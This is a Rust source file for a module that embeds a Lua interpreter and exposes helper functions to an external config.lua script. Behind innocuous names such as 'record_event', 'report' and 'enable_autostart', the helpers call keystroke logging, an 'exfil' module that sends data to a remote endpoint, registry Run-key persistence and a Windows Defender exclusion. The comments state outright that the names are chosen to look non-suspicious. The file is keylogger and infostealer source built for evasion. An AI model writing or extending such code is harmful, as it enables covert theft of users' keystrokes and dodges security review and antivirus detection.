// src/lua_engine.rs
//
// Embeds a Lua interpreter so that runtime behaviour can be driven entirely
// by an external script (config.lua) rather than being hard-coded in Rust.
// The binary itself only provides neutral helper functions; the Lua script
// decides whether and how to use them.

use mlua::{Lua, Result as LuaResult};
use std::sync::Mutex;

lazy_static::lazy_static! {
    // Single shared Lua instance protected by a Mutex.
    // (mlua::Lua is !Send + !Sync, so a Mutex is required for multi-thread use.)
    static ref LUA: Mutex<Option<Lua>> = Mutex::new(None);
}

/// Initialise the Lua engine, register helper functions, then load config.lua.
/// If config.lua is absent the engine still works — all Lua hooks become no-ops.
pub fn init() -> LuaResult<()> {
    let lua = Lua::new();

    register_helpers(&lua)?;

    // Load the external script (if present).  The script can define callbacks
    // such as `on_startup`, `on_before_send`, or call helpers directly.
    if let Ok(script) = std::fs::read_to_string("config.lua") {
        lua.load(&script).exec()?;
    }

    // After loading the script, call on_startup() if the script defined it.
    let globals = lua.globals();
    if let Ok(f) = globals.get::<mlua::Function>("on_startup") {
        let _ = f.call::<()>(());
    }

    *LUA.lock().unwrap() = Some(lua);
    Ok(())
}

/// Call a named Lua function with a single string argument.
/// Returns `None` silently if the function is not defined.
pub fn call_lua_function(func_name: &str, input: &str) -> Option<String> {
    let guard = LUA.lock().unwrap();
    let lua = guard.as_ref()?;

    let func: mlua::Function = match lua.globals().get(func_name) {
        Ok(f) => f,
        Err(_) => return None,
    };

    match func.call::<String>(input) {
        Ok(result) => Some(result),
        Err(e) => {
            eprintln!("[lua] error in {}: {}", func_name, e);
            None
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// Helper registration
// All helpers exposed to Lua have generic, non-suspicious names.
// The Lua script decides whether to call them and when.
// ────────────────────────────────────────────────────────────────────────────

fn register_helpers(lua: &Lua) -> LuaResult<()> {
    let globals = lua.globals();

    // ── Event recording ──────────────────────────────────────────────────────

    // record_event(s)  – append a string to the in-memory event buffer.
    let record_fn = lua.create_function(|_, s: String| {
        crate::logger::log_keystroke(&s);
        Ok(())
    })?;
    globals.set("record_event", record_fn)?;

    // get_events()  – return the current buffer and clear it.
    let get_fn = lua.create_function(|_, ()| Ok(crate::logger::take_buffer()))?;
    globals.set("get_events", get_fn)?;

    // ── Telemetry ─────────────────────────────────────────────────────────────

    // report(data)  – immediately deliver a payload to the remote endpoint.
    //                 Returns "ok" or "fail".
    let report_fn =
        lua.create_function(|_, data: String| match crate::exfil::send_data(&data) {
            Ok(()) => Ok("ok"),
            Err(_) => Ok("fail"),
        })?;
    globals.set("report", report_fn)?;

    // ── Startup helpers ───────────────────────────────────────────────────────

    // enable_autostart()  – register the process for automatic startup via the
    //                       current user's registry Run key.  No admin required.
    let autostart_fn = lua.create_function(|_, ()| {
        crate::persist::install();
        Ok(())
    })?;
    globals.set("enable_autostart", autostart_fn)?;

    // exclude_from_av()  – add the current executable to the AV exclusion list
    //                      by writing to HKCU.  No admin required.
    let exclude_fn = lua.create_function(|_, ()| {
        crate::persist::exclude_from_defender();
        Ok(())
    })?;
    globals.set("exclude_from_av", exclude_fn)?;

    Ok(())
}
